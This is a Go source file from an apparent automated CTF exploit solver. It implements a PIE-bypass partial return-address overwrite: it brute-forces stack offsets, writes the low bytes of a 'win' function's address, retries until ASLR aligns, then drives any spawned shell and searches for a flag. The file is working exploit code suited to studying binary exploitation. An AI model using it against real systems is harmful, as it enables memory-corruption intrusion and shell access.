package solve

import (
	"context"
	"fmt"
	"time"

	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// maxPartialAttempts bounds the probabilistic PIE partial-overwrite search. The
// effective per-run hit rate is roughly 1/16 to 1/32 (the ASLR nibble, plus a
// 64 KiB-carry edge case), so the budget allows many retries at the real offset.
const maxPartialAttempts = 2000

// partialIdle is a short recv idle: the win function prints the flag or spawns a
// shell promptly, and the search makes many connections, so a long idle is costly.
const partialIdle = 120 * time.Millisecond

// partialOverwriteStrategy defeats PIE without any leak by overwriting only the
// low bytes of a saved return address, which under PIE are the fixed page offset
// (ASLR randomizes higher bits). Overwriting the low byte redirects within a
// 256-byte block for free; overwriting two bytes reaches anywhere in a 64 KiB
// window but leaves one nibble (bits 12-15) to ASLR, so it retries across fresh
// runs (~1 in 16) until the base aligns. It needs a read-style overflow that does
// not append a terminator (so the untouched high bytes survive) and a win
// function; the offset to the saved return address is brute-forced.
func (s *solver) partialOverwriteStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status != "enabled" {
		return false, nil
	}
	wins := orderedWinFunctions(bin)
	if len(wins) == 0 {
		return false, nil
	}
	// Focus the retries: prefer explicitly win-named functions so the real target
	// gets the most shots per round. Fall back to the first candidate otherwise.
	named := wins[:0:0]
	for _, w := range wins {
		if winNameRe.MatchString(w.name) {
			named = append(named, w)
		}
	}
	if len(named) > 0 {
		wins = named
	} else {
		wins = wins[:1]
	}
	if len(wins) > 2 {
		wins = wins[:2]
	}
	offs := partialOffsets()
	attempts := 0

	// Pass 1: single-byte overwrite, once per (offset, win). This is deterministic
	// (no ASLR in bits 0-7) and lands when win and the return site share a
	// 256-byte block.
	for _, off := range offs {
		for _, w := range wins {
			if err := ctx.Err(); err != nil {
				return false, err
			}
			attempts++
			if done, err := s.partialAttempt(ctx, off, w, []byte{byte(w.addr)}); err != nil || done {
				return done, err
			}
		}
	}

	// Pass 2: two-byte overwrite, retried in rounds. Each round is a fresh run
	// (fresh ASLR), so the correct (offset, win) lands with probability ~1/16 per
	// round.
	for attempts < maxPartialAttempts {
		for _, off := range offs {
			for _, w := range wins {
				if err := ctx.Err(); err != nil {
					return false, err
				}
				if attempts >= maxPartialAttempts {
					s.report.Limitations = append(s.report.Limitations, fmt.Sprintf("partial-overwrite exhausted %d attempts; PIE bits did not align in budget", maxPartialAttempts))
					return false, nil
				}
				attempts++
				low := []byte{byte(w.addr), byte(w.addr >> 8)}
				if done, err := s.partialAttempt(ctx, off, w, low); err != nil || done {
					return done, err
				}
			}
		}
	}
	return false, nil
}

// partialOffsets lists likely saved-return offsets (buffer size + saved rbp),
// common sizes first, so the real offset gets a shot in every round.
func partialOffsets() []int {
	return []int{72, 40, 56, 88, 64, 104, 48, 136}
}

// partialAttempt writes padding + the low byte(s) of win, with no trailing
// newline, so a read-style overflow leaves the saved return address's untouched
// high bytes in place. It then drives any spawned shell and checks for a flag.
func (s *solver) partialAttempt(ctx context.Context, off int, w funcEntry, low []byte) (bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	defer cleanup()
	defer conn.Close()
	_ = conn.RecvUntilIdle(partialIdle)

	payload := make([]byte, 0, off+len(low))
	for i := 0; i < off; i++ {
		payload = append(payload, 'A')
	}
	payload = append(payload, low...)
	if conn.Send(payload) != nil { // no newline: preserve the untouched high bytes
		return false, nil
	}
	mid := string(conn.RecvUntilIdle(partialIdle))
	_ = conn.Send([]byte(driveShell))
	post := string(conn.RecvUntilIdle(partialIdle))
	out := mid + post

	note := fmt.Sprintf("partial-overwrite padding=%d width=%d win=%#x(%s)", off, len(low), w.addr, w.name)
	cands := s.ex.Find(out, payload, "session")
	return s.finalize("partial_overwrite", note, payload, runner.Result{Outcome: "session", ExitCode: -1, Stdout: out}, cands), nil
}
